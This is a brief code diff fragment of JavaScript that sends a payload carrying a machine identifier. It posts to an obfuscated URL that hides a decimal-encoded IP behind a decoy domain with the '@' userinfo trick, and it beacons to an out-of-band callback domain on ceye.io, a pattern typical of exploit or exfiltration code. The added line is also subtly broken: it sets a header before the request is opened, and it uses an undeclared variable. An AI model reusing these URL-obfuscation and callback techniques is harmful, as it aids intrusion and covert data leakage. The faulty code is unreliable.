@@ -29,6 +29,7 @@ var payload = {
     "machine_id":"host-9184"
 };
 var xhr3 = new XMLHttpRequest(); 
+xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.open('POST', 'http://www.baidu.com@2130706655:1337/update_tornado', true);
 xhr3.open('GET', 'http://running.6wox8c.ceye.io', true);
 xhr3.send();
